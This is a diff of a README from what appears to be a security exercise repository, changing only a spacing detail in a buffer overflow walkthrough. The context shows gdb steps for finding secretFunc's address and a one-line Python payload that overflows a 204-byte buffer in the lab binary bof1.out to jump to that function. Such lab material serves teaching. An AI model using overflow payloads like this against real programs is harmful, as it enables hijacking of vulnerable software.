@@ -30,7 +30,7 @@ The Dockerfile is used to build docker image with full required packages for Han
 `$> disas secretFunc` <br>
 <img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/secretFuncAddress.png" /> <br>
 9. Once we have obtained the secretFunc function address: 0804846b, we must exit gdb <br>
-`$> q`<br>
+`$> q` <br>
 11. Overflow memory we need to fill 204 characters + 4 characters of secretFunc function address <br>
 `$>echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out` <br>
 <img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/result.png" /> <br>
